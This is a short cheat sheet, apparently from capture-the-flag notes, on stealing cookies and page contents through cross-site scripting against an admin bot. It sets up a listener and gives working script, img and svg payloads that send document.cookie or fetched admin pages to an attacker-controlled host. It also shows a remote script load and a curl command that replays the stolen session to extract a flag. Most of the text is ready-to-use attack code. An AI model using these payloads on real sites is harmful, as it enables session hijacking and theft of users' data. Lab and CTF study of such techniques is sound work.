# Stealing cookies & data with XSS

Needs: an XSS that a **victim** (admin bot) executes, and a listener you control reachable from the
victim's browser.

## 1. Listener
```bash
python scripts/xss/catch_server.py --port 8000          # logs path, query, headers, body; serves x.js
# lab: run on 80/443 from your VPN IP; or a public catcher (webhook.site, interactsh)
```
→ [tools/oob-listeners.md](../tools/oob-listeners.md)

## 2. Payloads
```html
<script>new Image().src='http://YOU:8000/c?'+encodeURIComponent(document.cookie)</script>
<img src=x onerror="fetch('http://YOU:8000/c?'+document.cookie)">
<svg onload="location='http://YOU:8000/c?'+document.cookie">
<!-- cookie is HttpOnly? read pages as the victim instead -->
<script>fetch('/admin',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://YOU:8000/p',{method:'POST',body:t}))</script>
<!-- load a bigger script -->
<script src="http://YOU:8000/x.js"></script>
```

## 3. Use the stolen session
```bash
curl -s -b 'session=<stolen>' $T/admin | grep -o 'flag{[^}]*}'
```
Browser: DevTools → Application → Cookies → replace value → reload.

`HttpOnly` cookies can't be read by JS → act *through* the victim's browser (fetch admin pages,
submit forms) — see [csrf](csrf.md).
